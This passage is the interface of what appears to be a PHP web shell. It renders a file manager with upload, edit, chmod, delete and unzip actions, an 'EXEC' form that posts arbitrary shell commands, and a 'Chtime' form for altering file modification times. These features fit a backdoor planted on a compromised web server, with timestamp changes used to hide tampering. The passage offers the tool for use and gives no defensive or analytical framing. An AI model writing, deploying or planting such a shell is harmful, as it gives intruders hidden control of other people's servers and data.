                $file_now_path = $file_now_path . '/' . $v;
                echo '<span class="sep">/</span><span class="path-part"><a href="?path=' . htmlspecialchars($file_now_path) . '">' . htmlspecialchars(trim($v)) . '</a></span>';
            }
        }
        ?>
      </div>
      <div class="topbar-actions">
        <a class="home-btn" href="?path=<?php echo htmlspecialchars(dirname($data['SCRIPT_FILENAME'])); ?>">Home</a>
        <span class="badge-rw <?php echo $can_read  ? 'badge-ok' : 'badge-fail'; ?>">R</span>
        <span class="badge-rw <?php echo $can_write ? 'badge-ok' : 'badge-fail'; ?>">W</span>
        <a class="home-btn btn-logout" href="?logout=1" onclick="return confirm('Logout sekarang?')" style="margin-left:auto;">
          <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor" viewBox="0 0 16 16" style="vertical-align:middle;margin-right:4px;">
            <path fill-rule="evenodd" d="M10 12.5a.5.5 0 0 1-.5.5h-8a.5.5 0 0 1-.5-.5v-9a.5.5 0 0 1 .5-.5h8a.5.5 0 0 1 .5.5v2a.5.5 0 0 0 1 0v-2A1.5 1.5 0 0 0 9.5 2h-8A1.5 1.5 0 0 0 0 3.5v9A1.5 1.5 0 0 0 1.5 14h8a1.5 1.5 0 0 0 1.5-1.5v-2a.5.5 0 0 0-1 0v2z"/>
            <path fill-rule="evenodd" d="M15.854 8.354a.5.5 0 0 0 0-.708l-3-3a.5.5 0 0 0-.708.708L14.293 7.5H5.5a.5.5 0 0 0 0 1h8.793l-2.147 2.146a.5.5 0 0 0 .708.708l3-3z"/>
          </svg>
          Logout
        </a>
      </div>
      <?php if ($type == '' || $type == 1): ?>
      <div class="topbar-toolbar">
        <div class="topbar-toolbar-row">
          <form action="?path=<?php echo htmlspecialchars($file_path); ?>" method="post" enctype="multipart/form-data">
            <input type="hidden" name="act" value="upload"/>
            <input type="file" name="fileToUpload">
            <button type="submit" class="btn btn-upload">Upload</button>
          </form>
          <a class="btn btn-accent" href="?path=<?php echo htmlspecialchars($file_path); ?>&type=6">New File</a>
          <a class="btn btn-blue"   href="?path=<?php echo htmlspecialchars($file_path); ?>&type=7">New Folder</a>
        </div>
        <div class="topbar-toolbar-row">
          <form action="?path=<?php echo htmlspecialchars($file_path); ?>" method="post" style="display:flex;align-items:center;gap:.4rem;">
            <input type="hidden" name="act" value="exec"/>
            <input type="text" name="cmd" placeholder="whoami" style="max-width:400px;padding:.3rem .6rem;font-size:12px;border:1px solid var(--border2);border-radius:4px;background:var(--bg);color:var(--text);">
            <button type="submit" class="btn btn-accent" style="padding:.3rem .8rem;font-size:12px;">EXEC</button>
          </form>
        </div>
        <div class="topbar-toolbar-row">
          <form action="?path=<?php echo htmlspecialchars($file_path); ?>" method="post" id="del-top-form">
            <input type="hidden" name="act" value="del"/>
            <button type="submit" class="btn btn-danger" onclick="syncCheckboxes(); return confirm('Delete selected items?')">Delete Selected</button>
          </form>
        </div>
      </div>
      <?php endif; ?>
      </div>

    <!-- CONTENT -->
    <div class="zhyper-db-body">

      <?php if ($alert): echo $alert; endif; ?>

      <?php if ($type == 2 || $type == 3): ?>
      <div class="form-card">
        <h4>Edit File — <span><?php echo htmlspecialchars(basename($file_path)); ?></span></h4>
        <form action="?type=3" method="post">
          <input type="hidden" name="path" value="<?php echo htmlspecialchars($file_path); ?>"/>
          <div class="form-group">
            <label>Content</label>
            <textarea class="form-control" name="file_content" rows="25"><?php echo htmlspecialchars(file_get_contents($file_path)); ?></textarea>
          </div>
          <div class="form-actions">
            <button type="submit" class="btn btn-accent">Save</button>
            <a class="btn btn-ghost" href="?path=<?php echo htmlspecialchars($now_path); ?>">Cancel</a>
          </div>
        </form>
      </div>

      <?php elseif ($type == 4): ?>
      <div class="form-card">
        <h4>Rename — <span><?php echo htmlspecialchars(basename($file_path)); ?></span></h4>
        <form action="?type=4" method="post">
          <input type="hidden" name="path" value="<?php echo htmlspecialchars($file_path); ?>"/>
          <div class="form-group">
            <label>New Name</label>
            <input type="text" class="form-control" name="file_new_name" value="<?php echo htmlspecialchars(basename($file_path)); ?>">
          </div>
          <div class="form-actions">
            <button type="submit" class="btn btn-accent">Rename</button>
            <a class="btn btn-ghost" href="?path=<?php echo htmlspecialchars($now_path); ?>">Cancel</a>
          </div>
        </form>
      </div>

      <?php elseif ($type == 5): ?>
      <div class="form-card">
        <h4>Change Permission — <span><?php echo htmlspecialchars(basename($file_path)); ?></span></h4>
        <form action="?type=5" method="post">
          <input type="hidden" name="path" value="<?php echo htmlspecialchars($file_path); ?>"/>
          <div class="form-group">
            <label>Octal Permission (e.g. 0755)</label>
            <input type="text" class="form-control" name="new_chmod" value="<?php echo htmlspecialchars($old_chmod); ?>" style="max-width:200px;">
          </div>
          <div class="form-actions">
            <button type="submit" class="btn btn-warn">Change</button>
            <a class="btn btn-ghost" href="?path=<?php echo htmlspecialchars($now_path); ?>">Cancel</a>
          </div>
        </form>
      </div>

      <?php elseif ($type == 6): ?>
      <div class="form-card">
        <h4>Create New File</h4>
        <form action="?type=6" method="post">
          <input type="hidden" name="path" value="<?php echo htmlspecialchars($file_path); ?>"/>
          <div class="form-group">
            <label>File Name</label>
            <input type="text" class="form-control" name="new_name" value="<?php echo htmlspecialchars($new_name); ?>" placeholder="e.g. index.php">
          </div>
          <div class="form-group">
            <label>Content</label>
            <textarea class="form-control" name="new_content" rows="20" placeholder="File content..."><?php echo htmlspecialchars($new_content); ?></textarea>
          </div>
          <div class="form-actions">
            <button type="submit" class="btn btn-accent">Create</button>
            <a class="btn btn-ghost" href="?path=<?php echo htmlspecialchars($file_path); ?>">Cancel</a>
          </div>
        </form>
      </div>

      <?php elseif ($type == 7): ?>
      <div class="form-card">
        <h4>Create New Folder</h4>
        <form action="?type=7" method="post">
          <input type="hidden" name="path" value="<?php echo htmlspecialchars($file_path); ?>"/>
          <div class="form-group">
            <label>Folder Name</label>
            <input type="text" class="form-control" name="new_name" value="<?php echo htmlspecialchars($new_name); ?>" placeholder="e.g. uploads">
          </div>
          <div class="form-actions">
            <button type="submit" class="btn btn-accent">Create</button>
            <a class="btn btn-ghost" href="?path=<?php echo htmlspecialchars($file_path); ?>">Cancel</a>
          </div>
        </form>
      </div>

      <?php elseif ($type == 8): ?>
      <div class="form-card">
        <h4>Change Modification Time — <span><?php echo htmlspecialchars(basename($file_path)); ?></span></h4>
        <form action="?type=8" method="post">
          <input type="hidden" name="path" value="<?php echo htmlspecialchars($file_path); ?>"/>
          <div class="form-group">
            <label>Date & Time</label>
            <input type="text" class="form-control" name="new_datetime" 
                  value="<?php echo $current_date . ' ' . $current_time; ?>" 
                  placeholder="2026-02-10 17:33"
                  style="max-width:220px;">
          </div>
          <div class="form-actions">
            <button type="submit" class="btn btn-blue">Change</button>
            <a class="btn btn-ghost" href="?path=<?php echo htmlspecialchars($now_path); ?>">Cancel</a>
          </div>
        </form>
      </div>

      <?php elseif ($type == 9): ?>
      <div class="form-card">
        <h4>Unzip — <span><?php echo htmlspecialchars(basename($file_path)); ?></span></h4>
        <form action="?type=9" method="post">
          <input type="hidden" name="path" value="<?php echo htmlspecialchars($file_path); ?>"/>
          <div class="form-group">
            <label>Extract To (leave as-is for same folder)</label>
            <input type="text" class="form-control" name="extract_to" value="<?php echo htmlspecialchars($now_path); ?>">
          </div>
          <div class="form-actions">
            <button type="submit" class="btn btn-warn">Extract Now</button>
            <a class="btn btn-ghost" href="?path=<?php echo htmlspecialchars($now_path); ?>">Cancel</a>
          </div>
        </form>
      </div>

      <?php elseif ($type == 10): ?>
      <script>setTimeout(function(){ window.location.href = "?path=<?php echo rawurlencode($now_path); ?>"; }, 1200);</script>
      <div class="alert alert-success">Redirecting back...</div>

      <?php else: ?>
      <!-- FILE LIST -->
      <form action="?path=<?php echo htmlspecialchars($file_path); ?>" method="post" id="bulk-form">
        <input type="hidden" name="act" value="del"/>
        <div class="file-table-wrap">
          <table>
            <thead>
              <tr>
                <th><input type="checkbox" id="allcheck"></th>
                <th>Name</th>
                <th>URL</th>
                <th>Size</th>
                <th>Modified</th>
                <th>Owner / Group</th>
                <th>Permission</th>
                <th>Action</th>
              </tr>
            </thead>
            <tbody>
            <?php
            $has_files = false;
            foreach ($file_list as $v):
                if ($v === '.' || $v === '..') continue;
                $has_files  = true;
                $file_url   = $now_path . '/' . $v;
                $is_folder  = is_dir($file_url);
                $ext        = strtolower(pathinfo($file_url, PATHINFO_EXTENSION));
                $perm       = getFilePermission($file_url);
                $perm_ok    = is_writable($file_url);
                $mtime      = filemtime($file_url);
                $owner_grp  = getOwnerGroup($file_url);
                $owner_match  = (strpos($owner_grp, $current_user) !== false);
                $confirm_del = $is_folder
                    ? 'Delete FOLDER \'' . addslashes($v) . '\' and ALL its contents?'
                    : 'Delete file \'' . addslashes($v) . '\'?';
            ?>
              <tr>
                <td><input class="childcheck" type="checkbox" value="<?php echo htmlspecialchars($file_url); ?>" name="childcheck[]"></td>
                <td>
                  <?php if ($is_folder): ?>
                    <a href="?path=<?php echo htmlspecialchars($file_url); ?>&type=1" class="fname-folder">
                      <svg class="folder-icon" xmlns="http://www.w3.org/2000/svg" width="14" height="14" fill="currentColor" viewBox="0 0 16 16">
                        <path d="M.54 3.87.5 3a2 2 0 0 1 2-2h3.672a2 2 0 0 1 1.414.586l.828.828A2 2 0 0 0 9.828 3h3.982a2 2 0 0 1 1.992 2.181l-.637 7A2 2 0 0 1 13.174 14H2.826a2 2 0 0 1-1.991-1.819l-.637-7a1.99 1.99 0 0 1 .342-1.31zM2.19 4a1 1 0 0 0-.996 1.09l.637 7a1 1 0 0 0 .995.91h10.348a1 1 0 0 0 .995-.91l.637-7A1 1 0 0 0 13.81 4H2.19zm4.69-1.707A1 1 0 0 0 6.172 2H2.5a1 1 0 0 0-1 .981l.006.139C1.72 3.042 1.95 3 2.19 3h5.396l-.707-.707z"/>
                      </svg>
                      <?php echo htmlspecialchars($v); ?>
                    </a>
                  <?php else: ?>
                    <a href="?path=<?php echo htmlspecialchars($file_url); ?>&type=2" class="fname-file"><?php echo htmlspecialchars($v); ?></a>
                  <?php endif; ?>
                </td>
                <td>
                  <?php $visit_url = (strpos($file_url, $website_path) === 0) 
                      ? $web_url . '/' . rawurlencode(str_replace($website_path . '/', '', $file_url))
                      : ''; ?>
                  <?php if ($visit_url): ?>
                    <a class="url-link" href="<?php echo $visit_url; ?>" target="_blank">— visit</a>
                  <?php else: ?>
                    <span class="url-link" style="opacity:.4;">—</span>
                  <?php endif; ?>
                </td>
                <td><?php echo $is_folder ? '<span class="size-dir">DIR</span>' : getFileSize($file_url); ?></td>
                <td class="mtime"><?php echo date('Y-m-d H:i', $mtime); ?></td>
                <td class="<?php echo $owner_match ? 'owner' : 'owner-diff'; ?>"><?php echo htmlspecialchars($owner_grp); ?></td>
                <td class="<?php echo $perm_ok ? 'perm-ok' : 'perm-fail'; ?>"><?php echo $perm; ?></td>
                <td>
                  <div class="actions">
                    <a class="btn btn-blue"   href="?path=<?php echo htmlspecialchars($file_url); ?>&type=4">Rename</a>
                    <?php if (!$is_folder): ?>
                      <a class="btn btn-accent" href="?path=<?php echo htmlspecialchars($file_url); ?>&type=2">Edit</a>
                    <?php endif; ?>
                    <a class="btn btn-warn"   href="?path=<?php echo htmlspecialchars($file_url); ?>&type=5">Chmod</a>
                    <a class="btn btn-ghost"  href="?path=<?php echo htmlspecialchars($file_url); ?>&type=8">Chtime</a>
                    <?php if (!$is_folder && $ext === 'zip'): ?>
                      <a class="btn btn-warn" href="?path=<?php echo htmlspecialchars($file_url); ?>&type=9">Unzip</a>
                    <?php endif; ?>
                    <a class="btn btn-danger" href="?path=<?php echo htmlspecialchars($file_url); ?>&type=10"
                       onclick="return confirm('<?php echo htmlspecialchars($confirm_del, ENT_QUOTES); ?>')">Del</a>
                  </div>
                </td>
              </tr>
            <?php endforeach; ?>
            <?php if (!$has_files): ?>
              <tr><td colspan="8" class="empty-state">— No files in this directory —</td></tr>
            <?php endif; ?>
            </tbody>
          </table>
        </div>
      </form>
      <?php endif; ?>

    </div><!-- /zhyper-db-body -->
  </div><!-- /main -->
</div><!-- /layout -->

<script>
document.getElementById('allcheck') && document.getElementById('allcheck').addEventListener('change', function(){
    document.querySelectorAll('.childcheck').forEach(function(el){ el.checked = this.checked; }, this);
});

function syncCheckboxes() {
    var topForm = document.getElementById('del-top-form');
    if (!topForm) return;
    topForm.querySelectorAll('input[name="childcheck[]"]').forEach(function(el){ el.remove(); });
    document.querySelectorAll('.childcheck:checked').forEach(function(el){
        var inp = document.createElement('input');
        inp.type = 'hidden';
        inp.name = 'childcheck[]';
        inp.value = el.value;
        topForm.appendChild(inp);
    });
}
</script>
</body>
</html>